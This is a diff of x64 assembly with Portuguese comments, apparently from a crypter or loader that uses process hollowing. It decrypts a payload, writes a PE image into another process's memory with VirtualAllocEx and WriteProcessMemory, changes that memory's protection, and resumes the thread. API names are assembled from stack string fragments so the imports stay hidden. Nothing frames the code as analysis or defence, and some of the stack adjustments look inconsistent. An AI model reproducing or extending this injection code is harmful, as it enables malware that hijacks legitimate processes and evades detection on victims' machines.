@@ -170,7 +170,7 @@ section .data
 	
 section .codered
 	CodeRed:
-	Buffer2 times 800000                          db 0
+	Buffer2 times 800000                         db 0
 	
 section .deccode
 	decCode:
@@ -298,20 +298,7 @@ section .deccode
 	
 	
 	;ReadProcessMemory
-	
-	mov rax, "y"
-	push Rax
-	mov rax, "essMemor"
-	push Rax, 
-	mov rax, "ReadProc"
-	push rax
-	lea rdx, [rsp]
-	mov rcx, rbx
-	sub rsp, 0x30
-	call R14
-	add rsp, 0x30
-	add rsp, 0x10
-	mov r12, rax
+	call ReadProcessMemory
 	
 	;call ReadProcessMemory
 	mov rax, [ctx+CONTEXT.Rdx]
@@ -384,23 +371,9 @@ section .deccode
 			add rsp, 0x10
 
 
-		call Locate_kernel32
-		VirtualAllocEx:
+			call Locate_kernel32
 			;Lookup VirtualAllocEx
-			mov rax, "llocEx"
-			push rax
-			mov rax, "VirtualA"
-			push rax
-			lea rdx, [rsp]
-			mov rcx, r8
-			sub rsp, 0x30
-			call r14
-			add rsp, 0x30
-			add rsp, 0x10
-			mov r12, rax
-			
-
-			mov r15, rbx
+			call VirtualAllocEx
 			;call VirtualAllocEx
 			xor rcx,rcx
 			xor rbx,rbx
@@ -473,13 +446,10 @@ section .deccode
 			mov rax, [ProcInfo+PROCESSINFO.hThread]
 			lea rdx, [ctx+CONTEXT.P1Home]
 			mov rcx, Rax
-			call r12
-			
+			call r12			
 			
 			
 			call Locate_kernel32 
-		   ;call GetProcAddres
-
 			call LoadLibrary
 			mov r13, r15
 			;Load kernelbase.dll
@@ -494,25 +464,12 @@ section .deccode
 			add rsp, 0x30
 			add rsp, 0x10
 	
-	
 	      ;delta
 
 
-	WriteProcess:
-		;Lookup WriteProcessMemory
-		mov rax, "ry"
-		push rax
-		mov rax, "cessMemo"
-		push rax
-		mov rax, "WritePro"
-		push rax
-		lea rdx, [rsp]
-		mov rcx, r15
-		sub rsp, 0x30
-		call r14
-		mov r12, rax
-		add rsp, 0x30
-
+		;Lookup WriteProcess
+		call WriteProcess
+		
 		;call WriteProcessMemory
 		mov rax, [PE]
 		mov eax, dword[rax+0x54]
@@ -520,13 +477,29 @@ section .deccode
 		xor ebx,ebx
 		mov r8,[lpImageBase]
 		mov [rsp+0x20], rbx
-		mov rdx, [lpPebImageBase]
+		mov rdx, [lpPreferableBase]
 		mov rcx, [ProcInfo+PROCESSINFO.hProcess]
 		call r12
 		mov rbp, rax
 		add rsp, 0x30
-				  
-	
+		
+		call Locate_kernel32
+		;Lookuop VirtualProectEx
+		call VirtualProectEx
+		;call VirtualProtectEx
+		mov rax, [PE]
+		mov eax,  dword[rax+0x54]
+		mov r8d, eax
+		mov rdx, [allocex]
+		xor rcx,rcx
+		push rcx
+		lea rcx, [rsp]
+		mov [rsp+0x20],rcx
+		mov r9d, 2
+		mov rcx, [ProcInfo+PROCESSINFO.hProcess]
+		call r12
+		add rsp, 0x30
+		
 	
 	;delta   
 	Resume:
@@ -811,7 +784,7 @@ FechaArquivo:
          
 
 ;********************************
-;* ABAIXO SÃO FUNÇÕES PARA USO  *
+;* ABAIXO BUSCA POR FUNÇÕES     *
 ;********************************
 
 ; Percorra a tabela de endereços de exportação para encontrar o nome GetProcAddress
@@ -995,5 +968,75 @@ VirtualProect:
 	call r14; # Call GetProcessAddress
 	add rsp, 0x30; # Remove espaço locdo na pilha
 	add rsp, 0x10; # Remove a string alocada de  VirtualProtect 
-	mov rsi, rax; # Guarda o endereço de loadlibrary em RSI
+	mov rsi, rax; # Guarda o endereço de Virtual protect em RSI
+ret
+
+
+VirtualProectEx:
+; pega o endereco VirtualProtect usando GetProcAddress
+	sub rsp, 0x30
+	mov rax, "rotectEx"
+	push Rax
+	mov rax, "VirtualP"
+	push rax
+	mov [rsp+0x10], byte 0x00
+	mov rdx, rsp; # joga o ponteiro da string VirtualProtectEx para RDX
+	mov rcx, r8; # Copia o endereço base da Kernel32  para RCX
+	sub rsp, 0x30
+	call r14; # Call GetProcessAddress
+	add rsp, 0x30; # Remove espaço locdo na pilha
+	add rsp, 0x10; # Remove a string alocada de  VirtualProtect 
+	mov rsi, rax; # Guarda o endereço de Virtual protect em RSI
+	mov r12, rax
+	add rsp, 0x30
+ret
+
+
+
+WriteProcess:
+	;Lookup WriteProcessMemory
+	mov rax, "ry"
+	push rax
+	mov rax, "cessMemo"
+	push rax
+	mov rax, "WritePro"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, r15
+	sub rsp, 0x30
+	call r14
+	mov r12, rax
+	add rsp, 0x30
+	add rsp, 0x18
+ret
+
+VirtualAllocEx:
+	mov rax, "llocEx"
+	push rax
+	mov rax, "VirtualA"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, r8
+	sub rsp, 0x30
+	call r14
+	add rsp, 0x30
+	add rsp, 0x10
+	mov r12, rax
+ret
+
+ReadProcessMemory:
+	mov rax, "y"
+	push Rax
+	mov rax, "essMemor"
+	push Rax, 
+	mov rax, "ReadProc"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, rbx
+	sub rsp, 0x30
+	call R14
+	add rsp, 0x30
+	add rsp, 0x10
+	add rsp, 0x08
+	mov r12, rax
 ret
